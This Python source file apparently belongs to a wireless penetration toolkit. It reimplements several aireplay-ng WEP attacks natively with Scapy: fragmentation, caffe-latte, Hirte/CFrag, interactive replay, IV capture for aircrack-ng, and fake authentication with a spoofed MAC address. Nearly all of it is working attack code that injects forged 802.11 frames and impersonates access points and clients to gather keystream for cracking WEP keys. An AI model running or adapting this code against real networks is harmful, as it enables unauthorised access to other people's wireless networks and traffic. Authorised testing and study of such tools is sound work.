def _frag_attack_loop(
    iface: str,
    bssid: str,
    stop_event: threading.Event,
) -> None:
    """WEP fragmentation attack - inject fragmented WEP frames to recover PRGA.

    Captures encrypted data frames from the target AP, splits them into two
    802.11 fragments, and replays both fragments. A cooperating AP that
    reassembles the fragments and forwards them to the wired side reveals
    keystream (PRGA) via the chosen-plaintext structure of WEP.

    Replaces aireplay-ng -5 (fragmentation attack).

    Args:
        iface: Injection-capable monitor-mode interface.
        bssid: Target AP BSSID.
        stop_event: Event that signals the thread to stop.
    """
    # REFACTORED: substituido aireplay-ng -5 por implementacao nativa Scapy
    bssid_lower = bssid.lower()
    while not stop_event.is_set():
        captured: object | None = None

        def _grab(pkt):
            nonlocal captured
            if captured is not None or stop_event.is_set():
                return
            if pkt.haslayer(Dot11WEP):
                dot11 = pkt.getlayer(Dot11)
                if dot11 and (dot11.addr3 or "").lower() == bssid_lower:
                    wep = pkt[Dot11WEP]
                    wepdata = bytes(getattr(wep, "wepdata", b"") or b"")
                    if len(wepdata) >= 16:
                        captured = pkt

        try:
            sniff(
                iface=iface, prn=_grab, timeout=5,
                stop_filter=lambda p: captured is not None or stop_event.is_set(),
                store=False,
            )
        except Exception as exc:
            logger.debug("Frag attack sniff error: %s", exc)
            time.sleep(1)
            continue

        if captured is None or stop_event.is_set():
            continue

        wep = captured[Dot11WEP]
        iv_val = int(getattr(wep, "iv", 0))
        wepdata = bytes(getattr(wep, "wepdata", b"") or b"")
        dot11_hdr = captured[Dot11]

        half = max(8, len(wepdata) // 2)

        try:
            frag1 = (
                RadioTap()
                / Dot11(
                    type=dot11_hdr.type, subtype=dot11_hdr.subtype,
                    addr1=dot11_hdr.addr1, addr2=dot11_hdr.addr2, addr3=dot11_hdr.addr3,
                    FCfield=dot11_hdr.FCfield | 0x04,
                    SC=(dot11_hdr.SC & 0xFFF0) | 0,
                )
                / Dot11WEP(iv=iv_val, keyid=0, wepdata=wepdata[:half])
            )
            sendp(frag1, iface=iface, verbose=False)
            time.sleep(0.05)

            frag2 = (
                RadioTap()
                / Dot11(
                    type=dot11_hdr.type, subtype=dot11_hdr.subtype,
                    addr1=dot11_hdr.addr1, addr2=dot11_hdr.addr2, addr3=dot11_hdr.addr3,
                    FCfield=dot11_hdr.FCfield & ~0x04,
                    SC=(dot11_hdr.SC & 0xFFF0) | 1,
                )
                / Dot11WEP(iv=iv_val, keyid=0, wepdata=wepdata[half:])
            )
            sendp(frag2, iface=iface, verbose=False)
            logger.debug("Frag attack: sent 2 fragments (%d + %d bytes)", half, len(wepdata) - half)
        except Exception as exc:
            logger.debug("Frag send error: %s", exc)
        time.sleep(0.5)


def _caffe_latte_loop(
    iface: str,
    bssid: str,
    stop_event: threading.Event,
) -> None:
    """Caffe-latte client-side WEP attack via crafted 802.11 data nudges.

    Monitors the air for probe requests from WEP clients. For each new client
    MAC found, sends a crafted data frame (from-DS direction) to nudge the client
    into transmitting encrypted ARP responses that carry unique IVs.

    Replaces aireplay-ng -6 (caffe-latte attack).

    Args:
        iface: Injection-capable monitor-mode interface.
        bssid: Target AP BSSID (used as spoofed sender).
        stop_event: Event that signals the thread to stop.
    """
    # REFACTORED: substituido aireplay-ng -6 por implementacao nativa Scapy
    from scapy.all import Dot11ProbeReq

    seen_clients: list[str] = []

    def _grab_probe(pkt):
        if stop_event.is_set():
            return
        if not pkt.haslayer(Dot11ProbeReq):
            return
        dot11 = pkt.getlayer(Dot11)
        if dot11 is None:
            return
        client_mac = (dot11.addr2 or "").lower()
        if client_mac and client_mac not in seen_clients:
            seen_clients.append(client_mac)

    while not stop_event.is_set():
        try:
            sniff(
                iface=iface, prn=_grab_probe, timeout=5,
                stop_filter=lambda p: stop_event.is_set(),
                store=False,
            )
        except Exception as exc:
            logger.debug("Caffe-latte sniff error: %s", exc)
            time.sleep(1)
            continue

        for client in list(seen_clients):
            if stop_event.is_set():
                break
            nudge = (
                RadioTap()
                / Dot11(
                    type=2, subtype=8,
                    addr1=client, addr2=bssid, addr3=bssid,
                    FCfield="from-DS",
                )
            )
            try:
                sendp(nudge, iface=iface, verbose=False)
                logger.debug("Caffe-latte: nudge sent to client %s", client)
            except Exception as exc:
                logger.debug("Caffe-latte send error: %s", exc)
        time.sleep(0.5)


def _hirte_loop(
    iface: str,
    bssid: str,
    stop_event: threading.Event,
) -> None:
    """Hirte (CFrag) client-side WEP attack via fragmented LLC/SNAP injection.

    Monitors probe requests from WEP clients and injects fragmented 802.11 data
    frames carrying LLC/SNAP headers. The client, believing these are from its
    known AP, re-encrypts the fragment with a fresh IV and retransmits, generating
    new keystream material.

    Replaces aireplay-ng -7 (Hirte/CFrag attack).

    Args:
        iface: Injection-capable monitor-mode interface.
        bssid: Target AP BSSID (used as spoofed sender).
        stop_event: Event that signals the thread to stop.
    """
    # REFACTORED: substituido aireplay-ng -7 por implementacao nativa Scapy
    from scapy.all import Dot11ProbeReq

    seen_clients: list[str] = []

    def _grab_probe(pkt):
        if stop_event.is_set():
            return
        if not pkt.haslayer(Dot11ProbeReq):
            return
        dot11 = pkt.getlayer(Dot11)
        if dot11 is None:
            return
        client_mac = (dot11.addr2 or "").lower()
        if client_mac and client_mac not in seen_clients:
            seen_clients.append(client_mac)

    while not stop_event.is_set():
        try:
            sniff(
                iface=iface, prn=_grab_probe, timeout=5,
                stop_filter=lambda p: stop_event.is_set(),
                store=False,
            )
        except Exception as exc:
            logger.debug("Hirte sniff error: %s", exc)
            time.sleep(1)
            continue

        for client in list(seen_clients):
            if stop_event.is_set():
                break
            # First fragment: LLC/SNAP header carrying an IPv4 type field
            cfrag = (
                RadioTap()
                / Dot11(
                    type=2, subtype=8,
                    addr1=client, addr2=bssid, addr3=bssid,
                    FCfield=0x42,  # from-DS | More Fragments
                    SC=0x0000,
                )
                / LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03)
                / SNAP(OUI=0x000000, code=0x0800)
                / (b"\x00" * 8)
            )
            try:
                sendp(cfrag, iface=iface, verbose=False)
                logger.debug("Hirte: CFrag sent to client %s", client)
            except Exception as exc:
                logger.debug("Hirte send error: %s", exc)
        time.sleep(0.5)


def _interactive_replay_loop(
    iface: str,
    bssid: str,
    stop_event: threading.Event,
) -> None:
    """Interactive replay - capture any WEP data frame and replay it.

    Captures WEP-encrypted data frames associated with the target BSSID
    and immediately replays each one. This forces the AP to respond with a
    newly encrypted frame carrying a unique IV, increasing IV throughput
    without prior knowledge of the frame type.

    Replaces aireplay-ng -2 (interactive/P0841 replay).

    Args:
        iface: Injection-capable monitor-mode interface.
        bssid: Target AP BSSID.
        stop_event: Event that signals the thread to stop.
    """
    # REFACTORED: substituido aireplay-ng -2 por implementacao nativa Scapy
    bssid_lower = bssid.lower()
    replay_queue: list[object] = []
    queue_lock = threading.Lock()

    def _grab_data(pkt):
        if stop_event.is_set():
            return
        if not pkt.haslayer(Dot11WEP):
            return
        dot11 = pkt.getlayer(Dot11)
        if dot11 is None:
            return
        relevant = any(
            (addr or "").lower() == bssid_lower
            for addr in [dot11.addr1, dot11.addr2, dot11.addr3]
        )
        if relevant:
            with queue_lock:
                if len(replay_queue) < 10:
                    replay_queue.append(pkt)

    while not stop_event.is_set():
        try:
            sniff(
                iface=iface, prn=_grab_data, timeout=3,
                stop_filter=lambda p: stop_event.is_set(),
                store=False,
            )
        except Exception as exc:
            logger.debug("Interactive replay sniff error: %s", exc)
            time.sleep(1)
            continue

        with queue_lock:
            frames = list(replay_queue)
            replay_queue.clear()

        for frame in frames:
            if stop_event.is_set():
                break
            try:
                sendp(frame, iface=iface, verbose=False)
            except Exception as exc:
                logger.debug("Interactive replay send error: %s", exc)
            time.sleep(0.01)


def _capture_wep_ivs_scapy(
    iface: str,
    bssid: str,
    target_ivs: int = 50000,
    output_file: str = "/tmp/wep_capture.cap",
) -> dict:
    """Capture WEP IVs via native Scapy sniffing (blocking, single-call alternative).

    Simpler blocking alternative to the threaded _capture_ivs_scapy. Sniffs
    until target_ivs are collected or a 1-hour timeout expires, then writes
    all packets to a pcap file readable by aircrack-ng.

    Replaces airodump-ng IV capture for non-threaded use cases.

    Args:
        iface: Monitor mode interface.
        bssid: Target AP BSSID.
        target_ivs: Number of IVs to collect before stopping.
        output_file: Output .cap file for aircrack-ng.

    Returns:
        Dict with: count(int), filename(str), ready_to_crack(bool).
    """
    # REFACTORED: removido airodump-ng - substituido por captura nativa Scapy
    ivs: list[tuple[bytes, bytes]] = []
    all_pkts: list[object] = []
    bssid_lower = bssid.lower()

    def _process(pkt) -> None:
        if pkt.haslayer(Dot11WEP):
            dot11 = pkt.getlayer(Dot11)
            if dot11 and (dot11.addr3 or "").lower() == bssid_lower:
                wep = pkt[Dot11WEP]
                iv_val = int(getattr(wep, "iv", 0))
                iv = bytes([iv_val & 0xFF, (iv_val >> 8) & 0xFF, (iv_val >> 16) & 0xFF])
                wepdata = bytes(getattr(wep, "wepdata", b"") or b"")
                ivs.append((iv, wepdata))
        all_pkts.append(pkt)

    sniff(
        iface=iface,
        prn=_process,
        store=False,
        stop_filter=lambda _: len(ivs) >= target_ivs,
        timeout=3600,
    )

    if all_pkts:
        wrpcap(output_file, all_pkts)

    return {
        "count": len(ivs),
        "filename": output_file,
        "ready_to_crack": len(ivs) >= target_ivs,
    }


def _fake_auth_scapy(iface: str, bssid: str, client_mac: str, ssid: str) -> bool:
    """Perform a one-shot fake open system authentication via Scapy.

    Sends a single Dot11Auth (open system, seq 1) followed by a Dot11AssoReq
    to associate with the target WEP AP. Use _fake_auth_loop for persistent
    keepalive in threaded attack scenarios.

    Replaces aireplay-ng -1 (fake authentication, one-shot).

    Args:
        iface: Monitor-mode interface with injection capability.
        bssid: Target AP BSSID.
        client_mac: Source MAC address to impersonate.
        ssid: SSID of the target AP.

    Returns:
        True if frames were injected without error, False otherwise.
    """
    # REFACTORED: removido aireplay-ng -1 - substituido por implementacao nativa Scapy
    try:
        auth = (
            RadioTap()
            / Dot11(type=0, subtype=11, addr1=bssid, addr2=client_mac, addr3=bssid)
            / Dot11Auth(algo=0, seqnum=1, status=0)
        )
        sendp(auth, iface=iface, verbose=False)
        time.sleep(0.2)

        assoc = (
            RadioTap()
            / Dot11(type=0, subtype=0, addr1=bssid, addr2=client_mac, addr3=bssid)
            / Dot11AssoReq(cap=0x0431, listen_interval=10)
            / Dot11Elt(ID="SSID", info=ssid.encode("utf-8") if ssid else b"")
            / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96")
        )
        sendp(assoc, iface=iface, verbose=False)
        return True
    except Exception as exc:
        logger.debug("Fake auth (one-shot) injection error: %s", exc)
        return False


